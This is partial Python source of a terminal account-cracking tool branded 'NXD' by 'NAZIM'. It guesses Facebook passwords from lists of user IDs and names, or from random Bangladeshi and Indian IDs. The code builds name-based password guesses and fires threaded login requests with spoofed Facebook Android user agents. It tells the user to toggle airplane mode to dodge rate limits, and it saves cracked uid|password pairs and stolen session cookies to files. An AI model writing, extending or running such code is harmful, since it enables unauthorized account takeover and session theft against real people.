...
sys.stdout.write('\x1b]2; nazim\x07')
...
#_____________[ LOCK SYSTEM]_____________#
attemps = 0
...
\033[1;97m 
           '|.   '|' '||' '|' '||''|.   
            ...
            | '|. |     ||     ||   :|| 
            |   |||    | ||    ||   || 
           .|.   '|  .|   ||. .||..|'  \033[1;97m (\033[1;32mV10.1\033[1;97m)
\033[1;97m——————————————————————————————————————————————————
     ▁ ▂ ▃ ▅ ▆ ▇ █ AUTHOR:NAZIM █ ▇ ▆ ▅ ▃ ▂ ▁     
——————————————————————————————————————————————————
TELEGRAM    :  NXD-NAZIM
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(f'{G1}[{A}={G1}]{G1} TOTAL OK {A}:{G1} %s' % str(len(oks)))
        print(f'{G1}[{A}={G1}]{G1} TOTAL CP {A}:{G1} %s' % str(len(cps)))
        print(f'\r{A}──────────────────────────────────────────────────')
        input(f"{G1}[{A}={G1}]{G1} PRESS ENTER TO BACK MENU ")
        exit()
...
def menu():   
    ...
    print(f'{G1}[{A}2{G1}]{G1} RANDOM CLONING')
    print(f'{G1}[{A}3{G1}]{G1} CONTACT TOOL OWNER')
    print(f'{G1}[{A}0{G1}]{G1} EXIT TOOLS')
    linex()
    select = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}:{G1} ')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
    elif select =='3':
        os.system('xdg-open https://t.me/nXd_naZim');menu()
    elif select =='0':
        exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
    else:
        print(f'{G1}[{A}={G1}]{G1} VALID OPTION')
        time.sleep(2)
        menu()
...
def _randm_():   
    ...
    print(f'{G1}[{A}2{G1}]{G1} INDIA CLONING')
    print(f'{G1}[{A}0{G1}]{G1} BACK TO MAIN MENU')
    linex()
    select = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}:{G1} ')
    if select =='1':
        _bd_()
...
def _bd_():
    ...
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 3000{A}/{G1}5000{A}/{G1}10000{A}/{G1}99999');linex()
...
def _file_():
    ...
    print(f'{G1}[{A}2{G1}]{G1} METHOD {G1}[{A}M2{G1}]{G1} ')
    linex()
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/NXD-1.txt');linex()
        self.file = input(f'{G1}[{A}?{G1}]{G1} FILE NAME {A}:{G1} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{G1}[{A}={G1}]{G1} OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'{G1}[{A}={G1}]{G1} TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}NXD-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);nazimb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={nazimb};{ckkk}"
                    print(f"\r\r{G1}  [NXD-OK] {sid} | {ps} ")
                    print(f"\r\r{G1}[🍪] Cookies - {A} {ckkk} ")
                    open('/sdcard/NXD-NAZIM/FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/NXD-NAZIM/FILE-COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}NXD-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}:{G1} '))
            clear()
            print(f'{G1}[{A}?{G1}]{G1} EXAMPLE {A}:{G1} first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'{G1}[{A}={G1}]{G1} PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
            ...
            print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT {A}:{G1} {sl} ')
            print(f'{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{A}/{A}OFF{G1}]{G1} AIRPLANE MODE EVERY {A}3{G1} MIN')
            linex()
            with Habib(max_workers=30) as nazimworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                nazimworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                nazimworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}NXD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
